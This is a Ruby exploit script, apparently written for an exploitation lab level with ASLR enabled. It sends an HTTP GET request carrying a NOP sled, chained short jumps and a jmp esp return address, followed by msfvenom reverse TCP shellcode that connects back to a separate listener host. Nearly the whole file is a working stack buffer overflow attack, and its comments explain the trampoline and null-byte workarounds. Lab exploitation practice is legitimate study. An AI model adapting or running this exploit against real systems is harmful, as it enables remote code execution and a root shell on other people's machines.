#!/usr/bin/ruby

require"socket"

ip = "10.1.1.2"
port = 20001

#msfvenom -p linux/x86/shell_reverse_tcp LPORT=443 LHOST=10.1.1.3 -f ruby
#Payload size: 68 bytes
shell = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x01\x01" +
"\x03\x68\x02\x00\x01\xbb\x89\xe1\xb0\x66\x50\x51\x53\xb3" +
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f" +
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
#same as level00 but with ASLR enable
#search image for jmp esp
#root@kali:~/Desktop# ropper -f ./level01 -j esp
#JMP Instructions
#================
#0x08049f0f: call esp; 
#0x08049f4f: jmp esp; 
#2 gadgets found
#plan -> jmp esp and trampoline to execute code in parse_http_request buffer

pathbuff = "\x90"*(139 - 2)						#sled1 between 1st jmp to 2nd jmp
pathbuff += "\xEB\x16"							#2nd jmp = jmp short 0x18 to shell
pathbuff += [0x08049f4f].pack("L").force_encoding("utf-8")		#ret jmp esp 
pathbuff += "\xEB\x1E"							#1st jmp = jmp short 0x20

#***cant do one jmp short b/c over 127 byte
#cant use near jump b/c it has 0x00 which terminates the string

buf = "GET "
buf += pathbuff
buf += " HTTP/1.1"
buf += "\x90"*32							#2nd sled
buf += shell

TCPSocket.open(ip, port) do |s|
  s.print buf
  loop do
    msg = s.recv(0xffff)
    break if msg.length == 0
    puts msg
  end
end
